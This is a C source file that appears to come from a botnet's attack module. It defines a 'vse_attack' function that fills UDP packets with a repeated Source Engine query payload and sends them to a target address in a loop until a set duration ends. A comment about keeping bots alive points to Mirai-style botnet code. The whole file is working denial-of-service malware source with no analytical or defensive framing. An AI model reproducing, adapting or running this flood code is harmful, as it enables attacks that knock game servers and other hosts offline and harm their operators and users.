#define _GNU_SOURCE

#include "headers/vse_attack.h"
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <time.h>

void* vse_attack(void* arg) {
    attack_params* params = (attack_params*)arg;
    // bots wont die now
    if (!params) return NULL;
    if (params->psize <= 0 || params->psize > 1492) {
        params->psize = 24;
    }
    unsigned char vse_data[] = {
        0xFF, 0xFF, 0xFF, 0xFF, 0x54, 0x53, 0x6F, 0x75,
        0x72, 0x63, 0x65, 0x20, 0x45, 0x6E, 0x67, 0x69,
        0x6E, 0x65, 0x51, 0x75, 0x65, 0x72, 0x79, 0x00
    };
    int pattern_len = sizeof(vse_data);
    int packet_size = params->psize;
    if (packet_size < pattern_len) packet_size = pattern_len;
    unsigned char *packet = calloc(1, packet_size);
    if (!packet) {
        return NULL;
    }
    for (int i = 0; i < packet_size; i += pattern_len) {
        int copy_size = (packet_size - i) < pattern_len ? (packet_size - i) : pattern_len;
        memcpy(packet + i, vse_data, copy_size);
    }
    int udp_sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (udp_sock < 0) {
        free(packet);
        return NULL;
    }
    time_t end_time = time(NULL) + params->duration;
    while (params->active && time(NULL) < end_time) {
        ssize_t sent = sendto(udp_sock, packet, packet_size, 0, (struct sockaddr*)&(params->target_addr), sizeof(params->target_addr));
        if (sent < 0) break;
    }
    free(packet);
    close(udp_sock);
    return NULL;
}
